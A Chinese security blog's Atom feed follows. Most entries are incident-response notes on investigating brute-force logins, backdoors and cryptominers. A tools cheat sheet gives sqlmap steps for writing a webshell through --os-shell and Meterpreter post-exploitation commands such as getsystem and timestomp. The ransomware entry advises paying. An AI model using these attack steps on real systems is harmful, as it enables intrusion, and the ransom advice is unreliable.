<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Robin</title>
  
  <subtitle>LiuGuobin&#39;s blog</subtitle>
  <link href="https://liu1272.github.io/atom.xml" rel="self"/>
  
  <link href="https://liu1272.github.io/"/>
  <updated>2023-08-18T07:53:19.444Z</updated>
  <id>https://liu1272.github.io/</id>
  
  <author>
    <name>liuGuobin</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>暴力破解排查</title>
    <link href="https://liu1272.github.io/2023/08/17/%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3%E6%8E%92%E6%9F%A5/"/>
    <id>https://liu1272.github.io/2023/08/17/%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3%E6%8E%92%E6%9F%A5/</id>
    <published>2023-08-17T07:40:00.000Z</published>
    <updated>2023-08-18T07:53:19.444Z</updated>
    
    <content type="html"><![CDATA[<h5 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h5><p>暴力破解一般针对<br>ssh、mysql、ftp、redis、mongodb、smtp</p><h5 id="SSH暴力破解"><a href="#SSH暴力破解" class="headerlink" title="SSH暴力破解"></a>SSH暴力破解</h5><ol><li><p>使用<code>netstat -pantu</code>查看网络状态，重点是PID（当被破解时会有大量的ESTABLISHED）</p></li><li><p>使用<code>awk -F: &#39;&#123;if($3==0) print $1&#125;&#39; /etc/passwd</code>查找特殊权限账号（默认root）</p></li><li><p>查找可以使用ssh登录的账号</p><pre><code>s=$( sudo cat /etc/shadow | grep &#39;^[^:]*:[^\*!]&#39; | awk -F: &#39;&#123;print $1&#125;&#39;);for i in $s;do cat/etc/passwd | grep -v &quot;/bin/false\|/nologin&quot;| grep $i;done | sort | uniq |awk -F: &#39;&#123;print$1&#125;&#39;</code></pre></li><li><p>查看正在连接的ssh-session</p><pre><code>who -awlast -p nowsudo netstat -tnpa | grep &#39;ESTABLISHED.*sshd&#39;pgrep -af sshdecho $SSH_CONNECTIONss | grep ssh</code></pre></li><li><p>查看所有的账号信息</p><pre><code>/var/log/auth.log（Ubuntu）/var/log/secure（centOS）列出当前账户         who am i  </code></pre></li><li><p>查看登录日志</p><pre><code># 查看日志cd /var/log# 成功登录cat /var/log/auth.log | grep &quot;Accept&quot;# 正常退出cat /var/log/auth.log | grep &quot;pam_unix(sshd:session): session closed&quot;# 密码错误cat /var/log/auth.log | grep &quot;authentication failure&quot;# 连续错误cat /var/log/auth.log | grep &quot;message repeated 2 times&quot;</code></pre></li><li><p>统计数据</p><pre><code># 登录失败的用户名及其次数grep &quot;Failed password&quot; /var/log/auth.log|perl -e &#39;while($_=&lt;&gt;)&#123; /for(.*?)from/; print&quot;$1\n&quot;;&#125;&#39;|sort|uniq -c|sort -nr# 登录失败的IP及其次数cat /var/log/auth.log | grep &quot;Failed password for&quot; | grep &quot;root&quot; | grep -Po &#39;(1\d&#123;2&#125;|2[0-4]\d|25[0-5]|[1-9]\d|[1-9])(\.(1\d&#123;2&#125;|2[0-4]\d|25[0-5]|[1-9]\d|\d))&#123;3&#125;&#39; |sort|uniq -c|sort -nr</code></pre></li><li><p>加固防护<br>升级SSH版本至少为 7.7版本以上，7.7及以下版本存在SSH用户名枚举<br>加强口令复杂程度<br>禁止root用户登录，可以通过其他用户su到root<br>安装 <a href="https://github.com/fail2ban/fail2ban"><code>fail2ban</code></a> 来进行防御</p></li></ol><h5 id="Mysql暴力破解"><a href="#Mysql暴力破解" class="headerlink" title="Mysql暴力破解"></a>Mysql暴力破解</h5><p>Mysql 默认安装会保留登录日志，在 Ubuntu 上默认位置为 <code>/var/og/mysql/error.log</code></p><ol><li><p>查看登录失败的用户名</p><pre><code>cat /var/log/mysql/error.log | grep &quot;Access denied for user&quot; | grep &quot;using password: YES&quot; | awk -F &quot;&#39;&quot; &#39;&#123;print $2&#125;&#39; | sort | uniq -c | sort -nr</code></pre></li><li><p>查看登录失败的IP及次数</p><pre><code>cat /var/log/mysql/error.log | grep &quot;Access denied for user&quot; | grep &quot;using password: YES&quot; | awk -F &quot;&#39;&quot; &#39;&#123;print $2&#125;&#39; | sort| uniq | while read line;do echo $line;cat /var/log/mysql/error.log | grep &quot;Access denied for user&quot; | grep &quot;using password&quot; | awk -F &quot;&#39;&quot; &#39;&#123;print $4&#125;&#39; | sort | uniq -c | sort -nr; done</code></pre></li></ol><h5 id="FTP暴力破解"><a href="#FTP暴力破解" class="headerlink" title="FTP暴力破解"></a>FTP暴力破解</h5><ol><li>查看网络连接（如果有爆破会有大量的ESTABLISHED状态和TIME WAIT状态的网络连接）<pre><code>netstat -pantu</code></pre></li><li>查看最近的一个ftp会话（也可以用ftpwho查找）<pre><code>last -w -t</code></pre></li><li>查找日志<pre><code>cat /var/log/vsftpd.log   具体的位置可能不太一样，需要自己查找</code></pre></li><li>查找登录失败的账号<pre><code>cat /var/log/vsftpd.log | grep FAIL | cut -d &quot;[&quot; -f 3 | cut -d &quot;]&quot; -f 1 | sort | uniq -c | sort -nr</code></pre></li><li>查找登录失败的IP<pre><code>cat /var/log/vsftpd.log | grep FAIL | cut -d &quot;[&quot; -f 3 | cut -d &quot;]&quot; -f 1 | sort | uniq | while read line;do echo $line;cat /var/log/vsftpd.log | grep $line | cut -d &quot;:&quot; -f 7 | cut -d &#39;&quot;&#39; -f 1 | sort | uniq -c | sort -nr; done</code></pre></li><li>FTP服务加固<br>禁用 anonymous 和 ftp 两个账号<br>使用 SSL 加密 FTP<br>安装 fail2ban 来进行防御</li></ol><h5 id="Redis未授权暴力破解"><a href="#Redis未授权暴力破解" class="headerlink" title="Redis未授权暴力破解"></a>Redis未授权暴力破解</h5><p>将redis.conf 中的 requirepass 前的注释打开，并且设置一个复杂密码<br>缩减开放端口，建议仅在本机127.0.0.1使用<br>配置完成后需要重启来生效</p><ul><li>只有手动设置logfile才能保存日志，默认不设置默认的日志级别notice是不会记录登录、执行指令、退出的。</li><li>loglevel设置为 verbose或者debug才会记录登录主机</li><li>执行的指令<code>info，set</code>等即使 loglevel是 debug 级别也不会记录，但是会记录我们设置了多少个key， 具体key名称以及内容不会记录</li></ul><p><strong>虽然如此，但是失败成功的登录日志都是一样的……</strong><br><strong>没办法区分是不是攻击行为，只能问有没有人那个时候登过了</strong></p><h5 id="MongoDB暴力破解"><a href="#MongoDB暴力破解" class="headerlink" title="MongoDB暴力破解"></a>MongoDB暴力破解</h5><p>默认配置文件位置为 /etc/mongodb.conf<br>默认的的日志位置为 /var/og/mongodb/mongodb.log<br>打开verbose后能看到大量的failed事件<br>在/var/log/mongodb/mongodb.log查看</p><ol><li>登录失败的账户<pre><code>cat /var/log/mongodb/mongodb.log | grep -v &quot;UserNotFound&quot;|grep failed | awk -F &quot; &quot; &#39;&#123;print $9&#125;&#39; | sort|uniq -c|sort -nr</code></pre></li><li>登录所有账户失败的IP及次数<pre><code>cat /var/log/mongodb/mongodb.log | grep -v &quot;UserNotFound&quot;|grep failed | awk -F &quot; &quot; &#39;&#123;print $9&#125;&#39; |sort | uniq | while read line;do echo $line;cat /var/log/mongodb/mongodb.log |grep -v &quot;UserNotFound&quot; | grep failed | grep $line | awk -F &quot; &quot; &#39;&#123;print $14&#125;&#39; | cut -d &quot;:&quot; -f 1 | sort | uniq -c | sort -nr; done</code></pre></li><li>不存在账户的爆破事件<pre><code>cat /var/log/mongodb/mongodb.log | grep &quot;UserNotFound&quot;|grep failed | awk -F &quot; &quot; &#39;&#123;print $9&#125;&#39; |sort | uniq | while read line;do echo $line;cat /var/log/mongodb/mongodb.log |grep &quot;UserNotFound&quot; | grep failed | grep $line | awk -F &quot; &quot; &#39;&#123;print $14&#125;&#39; | cut -d &quot;:&quot; -f 1 | sort | uniq -c | sort -nr; done</code></pre></li></ol><h5 id="SMTP暴力破解"><a href="#SMTP暴力破解" class="headerlink" title="SMTP暴力破解"></a>SMTP暴力破解</h5><p>SMTP负责发，POP3、IMAP负责收，POP3协议客户端收到邮件，服务器端就会将其删除，除非有特殊的配置。<br>IMAP则弥补了这一缺陷，客户端该收收，服务端还给你保存着，同时你在客户端的各种配置操作都会在服务器上进行同步</p><pre><code>验证失败的账户IPcat /var/log/mail.log | grep &quot;authentication failed&quot; | grep -Po &#39;(1\d&#123;2&#125;|2[0-4]\d|25[0-5]|[1-9]\d|[1-9])(\.(1\d&#123;2&#125;|2[0-4]\d|25[0-5]|[1-9]\d|\d))&#123;3&#125;&#39; |sort|uniq -c|sort -nr</code></pre>]]></content>
    
    
      
      
    <summary type="html">&lt;h5 id=&quot;介绍&quot;&gt;&lt;a href=&quot;#介绍&quot; class=&quot;headerlink&quot; title=&quot;介绍&quot;&gt;&lt;/a&gt;介绍&lt;/h5&gt;&lt;p&gt;暴力破解一般针对&lt;br&gt;ssh、mysql、ftp、redis、mongodb、smtp&lt;/p&gt;
&lt;h5 id=&quot;SSH暴力破解&quot;&gt;&lt;a h</summary>
      
    
    
    
    <category term="日报" scheme="https://liu1272.github.io/categories/%E6%97%A5%E6%8A%A5/"/>
    
    
    <category term="日报" scheme="https://liu1272.github.io/tags/%E6%97%A5%E6%8A%A5/"/>
    
  </entry>
  
  <entry>
    <title>勒索病毒排查</title>
    <link href="https://liu1272.github.io/2023/08/17/%E5%8B%92%E7%B4%A2%E7%97%85%E6%AF%92%E6%8E%92%E6%9F%A5/"/>
    <id>https://liu1272.github.io/2023/08/17/%E5%8B%92%E7%B4%A2%E7%97%85%E6%AF%92%E6%8E%92%E6%9F%A5/</id>
    <published>2023-08-17T07:37:00.000Z</published>
    <updated>2023-08-17T07:40:12.131Z</updated>
    
    <content type="html"><![CDATA[<h5 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h5><p>正常情况下遇到勒索病毒就两种方法，要么找办法解开要么给钱。</p><h5 id="处置方法"><a href="#处置方法" class="headerlink" title="处置方法"></a>处置方法</h5><ol><li>查找勒索病毒特征，收集相关信息</li><li>深信服千里目实验室公众号直接回复病毒关键字</li><li>安全响应及EDR知识赋能平台</li><li>Freebuf</li><li>淘宝、闲鱼</li></ol><h5 id="解决方法"><a href="#解决方法" class="headerlink" title="解决方法"></a>解决方法</h5><p><strong>有解密工具就用解密工具<br>无解密工具就交钱</strong></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h5 id=&quot;概述&quot;&gt;&lt;a href=&quot;#概述&quot; class=&quot;headerlink&quot; title=&quot;概述&quot;&gt;&lt;/a&gt;概述&lt;/h5&gt;&lt;p&gt;正常情况下遇到勒索病毒就两种方法，要么找办法解开要么给钱。&lt;/p&gt;
&lt;h5 id=&quot;处置方法&quot;&gt;&lt;a href=&quot;#处置方法&quot; class=</summary>
      
    
    
    
    <category term="日报" scheme="https://liu1272.github.io/categories/%E6%97%A5%E6%8A%A5/"/>
    
    
    <category term="日报" scheme="https://liu1272.github.io/tags/%E6%97%A5%E6%8A%A5/"/>
    
  </entry>
  
  <entry>
    <title>远控后门排查</title>
    <link href="https://liu1272.github.io/2023/08/17/%E8%BF%9C%E6%8E%A7%E5%90%8E%E9%97%A8%E6%8E%92%E6%9F%A5/"/>
    <id>https://liu1272.github.io/2023/08/17/%E8%BF%9C%E6%8E%A7%E5%90%8E%E9%97%A8%E6%8E%92%E6%9F%A5/</id>
    <published>2023-08-17T03:10:00.000Z</published>
    <updated>2023-08-17T07:17:14.413Z</updated>
    
    <content type="html"><![CDATA[<h5 id="获取事件告警信息"><a href="#获取事件告警信息" class="headerlink" title="获取事件告警信息"></a>获取事件告警信息</h5><p>监控EDR、态势感知、防火墙等平台查看威胁告警以及日志。</p><h5 id="定位后门文件"><a href="#定位后门文件" class="headerlink" title="定位后门文件"></a>定位后门文件</h5><pre><code>根据告警信息定位后门文件位置，查找进程pidlsof | grep xxxx.xxlsof /root/xxxx.xxfuser /root/xxxx.xx</code></pre><h5 id="查看外连事件详情"><a href="#查看外连事件详情" class="headerlink" title="查看外连事件详情"></a>查看外连事件详情</h5><pre><code>根据五元组来查找通信的端口ip对应的pidnetstat -pantu | grep 114.114.114.114netstat -pantu | grep 65533lsof -i:65533netstat -pantu | grep 65533lsof -i:65533</code></pre><h5 id="查找进程信息"><a href="#查找进程信息" class="headerlink" title="查找进程信息"></a>查找进程信息</h5><pre><code>查找进程相关文件lsof -p 1234   （需要root权限）pwdx获取pid程序详细信息lsof -p pidpwdx pidsystemctl status pidcat /proc/pid/mapsls -al /proc/pid/exe</code></pre><h5 id="根据pid查看对应线程"><a href="#根据pid查看对应线程" class="headerlink" title="根据pid查看对应线程"></a>根据pid查看对应线程</h5><pre><code>ps H -T -p pidps -aLf pidpstree -agplU（推荐使用）</code></pre><h5 id="确定进程运行时间"><a href="#确定进程运行时间" class="headerlink" title="确定进程运行时间"></a>确定进程运行时间</h5><pre><code>ps -eo pid,lstart,etime,cmd | grep &lt;pid&gt;</code></pre><h5 id="比对恶意文件的创建时间"><a href="#比对恶意文件的创建时间" class="headerlink" title="比对恶意文件的创建时间"></a>比对恶意文件的创建时间</h5><pre><code>stat xxx.xxls -al xxx.xx</code></pre><h5 id="样本采集分析"><a href="#样本采集分析" class="headerlink" title="样本采集分析"></a>样本采集分析</h5><pre><code>使用SCP/Xshell等将样本移出主机，计算哈希值后到威胁情报平台中去搜索certutil -hashfile 文件 MD5</code></pre><h5 id="进程查杀"><a href="#进程查杀" class="headerlink" title="进程查杀"></a>进程查杀</h5><pre><code>【查找子进程】ps ajfxsystemctl status【杀死进程】kill -9 pid   （这样子是杀不死子进程的！！！）kill -9 -pid   （杀掉进程组）</code></pre><h5 id="删除文件"><a href="#删除文件" class="headerlink" title="删除文件"></a>删除文件</h5><pre><code># 查看文件占用，解除占用后删除lsof xxxx.xx# 移除 i, a 属性chattr -ia file.sh# 查看是否移除成功lsattr file.sh# 移除文件rm -rf file.sh# 奇怪文件名无法删除，先查inode再删除ls -li xxxx.xxfind ./* -inum 12327526 -deletefind ./ -inum 12327526 -exec rm &#123;&#125; \;find ./* -inum 12327526 -exec rm -i &#123;&#125; \;find ./* -inum 12327526 -exec rm -f &#123;&#125; \;find ./* -inum 12327526 |xargs rm -frm `find ./* -inum 12327526`# 目录挂载无法删除（Device or resource busy）sudo lsblk -asudo umount /dev/sdb1rm -rf xxxx.xx</code></pre><h5 id="补充：守护进程"><a href="#补充：守护进程" class="headerlink" title="补充：守护进程"></a>补充：守护进程</h5><pre><code># 守护进程是什么？其他进程都是在用户登录或运行程序时创建，在运行结束或用户注销时终止，但系统服务进程（守护进程）不受用户登录注销的影响，它们一直在运行着。# 守护进程的本质是什么？（1）守护进程的本职就是孤儿进程，该进程自成会话，自成进程组，一般守护进程与终端无关；（即：pid=sid=gid）（2）后台进程受用户登录注销的影响，而守护进程不受用户登录和注销的影响。但是它们都受关机的影响。# 守护进程有什么特点？1. 没有控制终端，终端名设置为？号2. 父进程不是用户创建的进程，一般由init进程或者systemd（pid=1）的进程为父进程3. 进程名字通常以字母 d 结束4. 工作目录为/（根），主要是为了防止占用磁盘导致无法卸载磁盘5. 以kthreadd内核进程创建的守护进程以kthreadd为父进程# 守护进程如何设置？1. 执行一个fork()，之后父进程退出，子进程继续执行。2. 子进程调用setsid()开启一个新回话并释放它与控制终端之间的所有关联关系。3. 在setsid()调用之后执行第二个fork()，让父进程退出并让孙进程继续执行。确保了子进程不会成为会话组长。（根据System V中获取终端的规则，进程永远不会重新请求一个控制终端。多一个fork()调用不会带来任何坏处。）4. 使用  umask(0);  清除进程的umask以确保当daemon创建文件和目录时拥有所需的权限。5. 修改进程的当前工作目录，通常会改为根目录（/）。6. 关闭daemon从其父进程继承而来的所有打开着的文件描述符。# 守护进程如何删除？1. 首先ps axj | grep 守护进程名字，找到相应的守护进程，然后使用kill -9 守护进程名杀掉；2. 利用ps -ef命令查找相应的守护进程，再用kill -9命令将其杀死；3. 创建shell脚本对进程的启动、关闭、重启进行自动管理。注：kill -9 -pid   （杀掉进程组）</code></pre><h5 id="补充：screen的原理"><a href="#补充：screen的原理" class="headerlink" title="补充：screen的原理"></a>补充：screen的原理</h5><ul><li>当用户启动Screen时，它会创建一个守护进程作为后台进程，并与用户终端会话（称为控制终端）分离。</li><li>控制终端不再直接处理用户输入和输出，而是由Screen守护进程负责接收和处理。</li><li>守护进程通过与Unix域套接字进行通信，与控制终端保持连接。</li><li>用户在控制终端中输入的命令会被发送到守护进程，并由守护进程解析和执行。</li><li>守护进程还负责从虚拟终端读取输出内容，并将其发送回控制终端进行显示。</li></ul><p>通过这种方式，Screen实现了在控制终端与守护进程之间的交互，并通过守护进程来管理多个虚拟终端、处理窗口切换、保存会话状态等功能。<br>需要注意的是，虽然Screen的守护进程在后台运行，但用户仍然可以通过重新连接到控制终端来恢复与之前会话的交互，即使之前的SSH连接断开或终端关闭。这是Screen的一个重要特性，允许用户在断开连接后恢复他们的工作环境。</p><h5 id="补充：恢复守护进程会话的交互"><a href="#补充：恢复守护进程会话的交互" class="headerlink" title="补充：恢复守护进程会话的交互"></a>补充：恢复守护进程会话的交互</h5><p>可以使用<code>nohup</code>命令启动一个守护进程，并将输出重定向到文件中，例如：</p><pre class="line-numbers language-shell"><code class="language-shell">nohup ./your_daemon &<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>通过这种方式启动的守护进程不会因为用户退出终端而停止运行。</p><p>当用户重新连接到控制终端时，可以使用<code>jobs</code>命令查看守护进程的状态，并使用<code>fg</code>命令将其调至前台，恢复与之前会话的交互。例如：</p><pre class="line-numbers language-shell"><code class="language-shell">jobsfg %job_id<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>其中，<code>job_id</code>是守护进程的作业号，可以在<code>jobs</code>命令的输出中找到。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h5 id=&quot;获取事件告警信息&quot;&gt;&lt;a href=&quot;#获取事件告警信息&quot; class=&quot;headerlink&quot; title=&quot;获取事件告警信息&quot;&gt;&lt;/a&gt;获取事件告警信息&lt;/h5&gt;&lt;p&gt;监控EDR、态势感知、防火墙等平台查看威胁告警以及日志。&lt;/p&gt;
&lt;h5 id=&quot;定位后门文</summary>
      
    
    
    
    <category term="日报" scheme="https://liu1272.github.io/categories/%E6%97%A5%E6%8A%A5/"/>
    
    
    <category term="日报" scheme="https://liu1272.github.io/tags/%E6%97%A5%E6%8A%A5/"/>
    
  </entry>
  
  <entry>
    <title>挖矿事件排查</title>
    <link href="https://liu1272.github.io/2023/08/16/%E6%8C%96%E7%9F%BF%E4%BA%8B%E4%BB%B6%E6%8E%92%E6%9F%A5/"/>
    <id>https://liu1272.github.io/2023/08/16/%E6%8C%96%E7%9F%BF%E4%BA%8B%E4%BB%B6%E6%8E%92%E6%9F%A5/</id>
    <published>2023-08-16T08:51:00.000Z</published>
    <updated>2023-08-16T12:49:26.734Z</updated>
    
    <content type="html"><![CDATA[<h5 id="第一步：获取信息"><a href="#第一步：获取信息" class="headerlink" title="第一步：获取信息"></a>第一步：获取信息</h5><ul><li>下线服务器之后从DNS服务器、防火墙、态势感知平台等地方获取到攻击事件详细信息</li><li>根据上传来源的IP/域名，在威胁情报平台查询确定木马类型</li><li>获取异常进程的pid</li></ul><pre><code>CPU占用：top -c -o %CPUps -eo pid,ppid,%mem,%cpu,cmd --sort=-%cpu | head -n 5内存占用：top -c -o %MEMps -eo pid,ppid,%mem,%cpu,cmd --sort=-%mem | head -n 5网络占用：安装后使用nethogs或者jnettop进行查询根据进程名或字符串查询：pidof &quot;name&quot;ps -aux | grep &quot;name&quot;ps -ef | grep &quot;name&quot; | grep -v grep | awk &#39;&#123;print $2&#125;&#39;pgrep -f &quot;name&quot;</code></pre><ul><li>根据pid查询详细信息（当查询不到时有可能是/proc/pid隐藏了）</li></ul><pre><code>lsof -p pidpwdx pidsystemctl status pidcat /proc/pid/mapsls -al /proc/pid/exe</code></pre><ul><li>根据pid查看对应线程</li></ul><pre><code>ps H -T -p pidps -aLf pidpstree -agplU（推荐使用）</code></pre><ul><li>确定进程运行时间</li></ul><pre><code>ps -eo pid,lstart,etime,cmd | grep &lt;pid&gt;</code></pre><ul><li>比对恶意文件的创建时间</li></ul><pre><code>stat xxx.xxls -al xxx.xx</code></pre><ul><li>样本采集分析</li></ul><pre><code>使用SCP/Xshell等将样本移出主机，计算哈希值后到威胁情报平台中去搜索certutil -hashfile 文件 MD5</code></pre><ul><li>进程查杀</li></ul><pre><code>【查找子进程】ps ajfxsystemctl status【杀死进程】kill -9 pid   （这样子是杀不死子进程的！！！）kill -9 -pid   （杀掉进程组）</code></pre><ul><li>删除文件</li></ul><pre><code># 查看文件占用，解除占用后删除lsof xxxx.xx# 移除 i, a 属性chattr -ia file.sh# 查看是否移除成功lsattr file.sh# 移除文件rm -rf file.sh# 奇怪文件名无法删除，先查inode再删除ls -li xxxx.xxfind ./* -inum 12327526 -deletefind ./ -inum 12327526 -exec rm &#123;&#125; \;find ./* -inum 12327526 -exec rm -i &#123;&#125; \;find ./* -inum 12327526 -exec rm -f &#123;&#125; \;find ./* -inum 12327526 |xargs rm -frm `find ./* -inum 12327526`# 目录挂载无法删除（Device or resource busy）sudo lsblk -asudo umount /dev/sdb1rm -rf xxxx.xx</code></pre><ul><li>网页挖矿排查</li></ul><pre><code># 浏览器查看历史记录，定位到该事件点访问的页面# 进入虚拟机进行访问，并限制进程只允许占用一个cpu# 查看该网页的源码和网络链接调用# 将浏览器缓存文件进行检测（大多数是JS）# 清除浏览数据&gt;清除缓存文件# 解密恶意文件查看矿池地址以及连接条件# 上区块链网站溯源</code></pre>]]></content>
    
    
      
      
    <summary type="html">&lt;h5 id=&quot;第一步：获取信息&quot;&gt;&lt;a href=&quot;#第一步：获取信息&quot; class=&quot;headerlink&quot; title=&quot;第一步：获取信息&quot;&gt;&lt;/a&gt;第一步：获取信息&lt;/h5&gt;&lt;ul&gt;
&lt;li&gt;下线服务器之后从DNS服务器、防火墙、态势感知平台等地方获取到攻击事件详细信息&lt;</summary>
      
    
    
    
    <category term="日报" scheme="https://liu1272.github.io/categories/%E6%97%A5%E6%8A%A5/"/>
    
    
    <category term="日报" scheme="https://liu1272.github.io/tags/%E6%97%A5%E6%8A%A5/"/>
    
  </entry>
  
  <entry>
    <title>安全工具</title>
    <link href="https://liu1272.github.io/2023/08/12/%E5%AE%89%E5%85%A8%E5%B7%A5%E5%85%B7/"/>
    <id>https://liu1272.github.io/2023/08/12/%E5%AE%89%E5%85%A8%E5%B7%A5%E5%85%B7/</id>
    <published>2023-08-12T02:51:00.000Z</published>
    <updated>2023-08-12T04:38:48.589Z</updated>
    
    <content type="html"><![CDATA[<h5 id="Nmap常用命令"><a href="#Nmap常用命令" class="headerlink" title="Nmap常用命令"></a>Nmap常用命令</h5><pre><code>nmap hostname/ip或者多个ip或者子网192.168.123.*-iL ip.txt 扫描ip.txt的所有ip-A 包含了-sV，-O，探测操作系统信息和路由跟踪（激烈扫描，一般不用）-O 探测操作系统信息-sV 查找主机服务版本号-sA 探测该主机是否使用了包过滤器或防火墙（建议使用wafw00f）-sS 半开扫描，一般不会记入日志，不过需要root权限。-sT TCP connect扫描，这种方式会在目标主机的日志中记录大批的链接请求以及错误信息。-sP ping扫描，一般最好不加，因为有的主机会禁止ping，却实际存在。-Pn 扫描之前不使用ping，适用于防火墙禁止ping，比较有用。-sN TCP空扫描-F 快速扫描-p 指定端口/端口范围-oN 将报告写入文件-v 详细信息-T&lt;0-5&gt; 设定速度使用脚本：--script all 使用所有脚本--script=sql.injection.nse sql注入--script=&quot;smb*&quot; 扫smb系列一、4 大功能：分别为主机发现（参数-sn）、端口扫描(-sS -sU)、版本侦测(–sV)、OS侦测(-O)二、扫描方式有：tcp connect()、TCP SYN scanning、TCP FIN scanning、Nullscan等三、绕过 ping 扫描参数为：nmap -Pn XXX.XXX.XXX.XXX四、漏洞检测可直接 nmap 目标 --script=auth,vuln</code></pre><h5 id="SQLmap"><a href="#SQLmap" class="headerlink" title="SQLmap"></a>SQLmap</h5><pre><code>-u 单个URL -m xx.txt 多个URL-d &quot;mysql://user:password@10.10.10.137:3306/dvwa&quot; 作为服务器客户端，连接数据库--data post/get都适用-p 指定扫描的参数-r 读取文件-f 指纹信息--tamper 混淆脚本，用于应用层过滤--cookie --user-agent --host 对http头的修改--threads 并发线程，默认为1--dbms MySQL&lt;5.0&gt; 指定数据库或版本–level=LEVEL 执行测试的等级（1-5，默认为 1）–risk=RISK 执行测试的风险（0-3，默认为 1） Risk升高可造成数据被篡改等风险–current-db 获取当前数据库名称–dbs 枚举数据库管理系统数据库–tables 枚举 DBMS 数据库中的表–columns 枚举 DBMS 数据库表列-D DB 要进行枚举的数据库名-T TBL 要进行枚举的数据库表-C COL 要进行枚举的数据库列-U USER 用来进行枚举的数据库用户常用的tamper：base64encode.py 转为b64编码charencode.py url编码chardoubleencode.py 双URL编码unmagicquotes.py 宽字节randomcomments.py 用`/**/`分割SQL关键字space2plus.py space2comment.py space2xxxx.py 替换空格为xxPost注入：sqlmap -r &quot;数据包地址&quot; -p &quot;参数&quot; -dbms 数据类型Get注入：sqlmap -u &quot;注入点地址&quot; --dbms 参数sqlmap进行交互式写shell：1-前提条件：最高权限、知道web网站绝对路径、能获取到cookie2-sqlmap.py -u &quot;注入点地址&quot; --cookie=&quot;cookie值&quot; --os-shell-echo “一句话木马”&gt;网站的绝对路径3-输入web网站的绝对路径4-传木马</code></pre><h5 id="菜刀、蚁剑、冰蝎、CS、哥斯拉"><a href="#菜刀、蚁剑、冰蝎、CS、哥斯拉" class="headerlink" title="菜刀、蚁剑、冰蝎、CS、哥斯拉"></a>菜刀、蚁剑、冰蝎、CS、哥斯拉</h5><p><strong>菜刀特征</strong><br>使用了base64的方式加密了发送给“菜刀马”的指令，其中的两个关键payload <code>z1</code>和<code>z2</code>，这个名字是可变的</p><p><strong>蚁剑特征</strong><br>默认的USER-agent请求头是<code>antsword xxx</code>，但是可以修改<code>/modules/request.js</code>文件<br>其中流量最中明显的特征为<code>@ini_set(&quot;display_errors&quot;,&quot;0&quot;);</code>这段代码基本是所有WebShell客户端链接PHP类WebShell都有的一种代码<br>蚁剑混淆加密后还有一个比较明显的特征,即为参数名大多以<code>“_0x......=”</code>这种形式（下划线可替换），所以以_0x开头的参数名也很可能就是恶意流量</p><p><strong>冰蝎</strong><br>看包没有发现什么特征，但是可以发现它是POST请求的</p><ol><li>Accept头有<code>application/xhtml+xmlapplication/xmlapplication/signed-exchange</code>属于弱特征（UA头的浏览器版本很老）</li><li>特征分析<code>Content-Type: application/octet-stream</code>这是一个强特征，查阅资料可知octet-stream的意思是，只能提交二进制，而且只能提交一个二进制，如果提交文件的话，只能提交一个文件,后台接收参数只能有一个，而且只能是流（或者字节数组），所以很少使用</li></ol><p><strong>冰蝎2特征</strong><br>默认Accept字段的值很特殊,而且每个阶段都一样冰蝎内置了十余种UserAgent，每次连接shell会随机选择一个进行使用，但是可以在burp中修改ua头。<br><code>Content-Length: 16</code>, 16就是冰蝎2连接的特征</p><p><strong>冰蝎3特征</strong><br>目前很多waf等设备都做了冰蝎2的流量特征分析，所以3取消了动态密钥获取；抓包没有发现什么特征，但它是POST请求的</p><ol><li>Accept头<code>application/xhtml+xmlapplication/xmlapplication/signed-exchange</code>属于弱特征</li><li>ua头该特征属于弱特征，通过burp可以修改。冰蝎3.0内置的默认16个userAgent都比较老，也可以作为waf规则特征</li></ol><p><strong>哥斯拉特征</strong><br>【PHP连接特征】</p><ol><li>使用了php_XOR_BASE64</li><li>请求都含有”pass=”<br>【jsp连接特征】</li><li>使用了java_AES_BASE64</li><li>是用了java_AES_RAW</li><li>与php请求一样都含有<code>&quot;pass=&quot;</code>而且发起连接时服务器返回的Content-Length是0</li></ol><h5 id="wireshark"><a href="#wireshark" class="headerlink" title="wireshark"></a>wireshark</h5><p>过滤 ip:<br>过滤源 ip 地址:ip.src==1.1.1.1;,目的 ip 地址:ip.dst==1.1.1.1;<br>过滤端口:<br>过滤 80 端口:tcp.port==80,源端口:tcp.srcport==80,目的端<br>口:tcp.dstport==80<br>协议过滤:<br>直接输入协议名即可,如 http 协议 http<br>http 模式过滤:<br>过滤 get/post 包 http.request.mothod==”GET/POST”</p><h5 id="MSF"><a href="#MSF" class="headerlink" title="MSF"></a>MSF</h5><pre><code>常用命令：background  让meterpreter处于后台模式sessions -i number  与会话进行交互，number表示第n个sessionquit  退出会话shell  获得命令行cat  c:\\boot.ini 查看文件内容getwd  查看当前工作目录work directory upload /root/Desktop/netcat.exe c:\\   上传文件到目标机上download 0xfa.txt /root/Desktop/   下载文件到本机上edit c:\\boot.ini   编辑文件search -d d:\\www -f web.config  查找文件ps  查看当前活跃进程migrate pid  将Meterpreter会话移植到进 程数位pid的进程中execute -H -i -f cmd.exe  创建新进程getpid  获取当前进程的pid kill pid  杀死进程getuid  查看权限sysinfo  查看目标机系统信息，如机器名，操作系统等getsystem  提权操作timestompc:/a.doc -c &quot;10/27/2015 14:22:11&quot;  修改文件的创建时间迁移进程：- meterpreter &gt; ps- 自行选择PID- meterpreter &gt; migrate pid</code></pre><h4 id="一些免杀的了解"><a href="#一些免杀的了解" class="headerlink" 